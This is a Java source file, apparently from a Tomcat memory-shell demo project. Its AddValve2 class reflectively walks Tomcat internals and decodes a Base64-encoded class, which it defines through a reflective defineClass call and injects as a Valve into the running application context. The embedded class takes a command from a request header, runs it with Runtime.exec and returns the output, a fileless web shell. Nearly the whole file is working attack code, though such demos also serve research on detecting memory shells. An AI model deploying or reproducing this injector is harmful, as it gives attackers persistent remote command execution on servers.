package com.example.tomcatmemshell.demos.web.spel;

import org.apache.catalina.Context;
import org.apache.catalina.Valve;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Base64;

public class AddValve2 {

    public static String VALVE_CLASS_STRING = "yv66vgAAADQAmAoAHABHCAA5CwA9AEgKAEkASgoASQBLCgA/AEwHAE0HAE4KAAgATwoABwBQCgA7AFEKADwAUgoABwBTCgBBAFQKAEEAVQoAVgBXCABYCgBZAFoKAFsAXAoAXQBeCgBbAF8IAGAKAD8AYQcAYgoAGwBjCwBkAGUHAGYHAGcBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxjb20vZXhhbXBsZS90b21jYXRtZW1zaGVsbC9kZW1vcy93ZWIvYWRkdmFsdmUvTWVtc2hlbGxWYWx2ZTsBAAZpbnZva2UBAFIoTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3Q7TG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOylWAQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAR1c2VGAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABXVzZUYyAQAHcmVxdWVzdAEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEACHJlc3BvbnNlAQAoTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAGgHAGkHAGoHAGsHAGwHAG0HAG4BAApFeGNlcHRpb25zBwBvBwBwAQAKU291cmNlRmlsZQEAEk1lbXNoZWxsVmFsdmUuamF2YQwAHQAeDABxAHIHAHMMAHQAdQwAdgB3DAB4AHkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAHQB6DAAdAHsMAHwAfQwAfgB/DACAAIEMAIIAgwwAhAAeBwCFDACGAIcBAAt1c2luZ1dyaXRlcgcAiAwAiQCKBwCLDACMAI0HAI4MAI8AkAwAkQCSAQARdXNpbmdPdXRwdXRTdHJlYW0MAJMAlAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAJUAlgcAlwwAJAAlAQA7Y29tL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvZGVtb3Mvd2ViL2FkZHZhbHZlL01lbXNoZWxsVmFsdmUBACRvcmcvYXBhY2hlL2NhdGFsaW5hL3ZhbHZlcy9WYWx2ZUJhc2UBACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0AQAmb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2UBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAEGphdmEvbGFuZy9PYmplY3QBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEWphdmEvbGFuZy9Cb29sZWFuAQAHdmFsdWVPZgEAFihaKUxqYXZhL2xhbmcvQm9vbGVhbjsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAd3YWl0Rm9yAQADKClJAQAHZ2V0TmV4dAEAHSgpTG9yZy9hcGFjaGUvY2F0YWxpbmEvVmFsdmU7AQAZb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZQAhABsAHAAAAAAAAgABAB0AHgABAB8AAAAvAAEAAQAAAAUqtwABsQAAAAIAIAAAAAYAAQAAAA0AIQAAAAwAAQAAAAUAIgAjAAAAAQAkACUAAgAfAAACCgAFAAwAAACwK04tEgK5AAMCADoEGQTGAJa4AAQZBLYABToFGQW2AAY6BrsAB1m7AAhZGQa3AAm3AAo6Byu2AAu2AAw6CRkHtgANWToIxgANGQkZCLYADqf/7hkJtgAPK7YAC7YAEBIRtgASOgoZCgS2ABMZCiu2AAsDuAAUtgAVK7YAC7YAEBIWtgASOgsZCwS2ABMZCyu2AAsDuAAUtgAVGQW2ABdXpwAFOgUqtgAZKyy5ABoDALEAAQARAJ8AogAYAAMAIAAAAFYAFQAAABAAAgARAAwAEgARABQAGwAVACIAFgA0ABoAPQAbAEgAHABSAB8AVwAgAGUAIQBrACIAeAAkAIYAJQCMACYAmQAoAJ8ALACiACoApAAuAK8ALwAhAAAAegAMABsAhAAmACcABQAiAH0AKAApAAYANABrACoAKwAHAEUAWgAsAC0ACAA9AGIALgAvAAkAZQA6ADAAMQAKAIYAGQAyADEACwAAALAAIgAjAAAAAACwADMANAABAAAAsAA1ADYAAgACAK4ANwA4AAMADACkADkALQAEADoAAABkAAT/AD0ACgcAGwcAOwcAPAcAPQcAPgcAPwcAQAcABwAHAEEAAP8AFAAKBwAbBwA7BwA8BwA9BwA+BwA/BwBABwAHBwA+BwBBAAD/AE8ABQcAGwcAOwcAPAcAPQcAPgABBwAYAQBCAAAABgACAEMARAABAEUAAAACAEY=";
    public AddValve2() {
        try {

            // 从线程中获取类加载器WebappClassLoaderBase
            TomcatEmbeddedWebappClassLoader contextClassLoader = (TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();
            // 获取TomcatEmbeddedContext对象
            WebResourceRoot resource = (WebResourceRoot) getField(contextClassLoader,Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources"));
            Context context=  resource.getContext();
            // 从上下文中获取ApplicationContext对象
            ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));

            // 从Application中获取StandardService对象
            StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));

            // 从StandardService中获取Connector数组
            Connector[] connectors = standardService.findConnectors();
            for (Connector connector : connectors) {
                if (connector.getScheme().toLowerCase().contains("http")) {
                    // 获取Connector对象的protocolHandler属性值
                    ProtocolHandler protocolHandler = connector.getProtocolHandler();
                    // 筛选我们需要的Abstract
                    if (protocolHandler instanceof AbstractProtocol) {
                        // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                        // 反射获取该方法
                        Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                        getHandler.setAccessible(true);
                        AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                        // 从上面获取的handler中取出global属性值
                        RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                        // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                        ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                        // 遍历List中的元素
                        for (Object processor : processors) {
                            RequestInfo requestInfo = (RequestInfo) processor;
                            // 获取对应的Request对象
                            org.apache.coyote.Request reqs = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) reqs.getNote(1);


                            // 创建自定义 Servlet
                            Class<?> servletClass = getClass(VALVE_CLASS_STRING);

                            StandardContext context2 = (StandardContext) request.getContext();
                            context2.addValve((Valve) servletClass.newInstance());


                        }
                    }
                }
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getField(Object obj, Field field) {
        try {
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception e) {

        }
        return null;
    }

    public static Class<?> getClass(String classCode) throws InvocationTargetException, IllegalAccessException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        byte[] bytes = Base64.getDecoder().decode(classCode);

        Method method = null;
        Class<?> clz = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;

    }
}
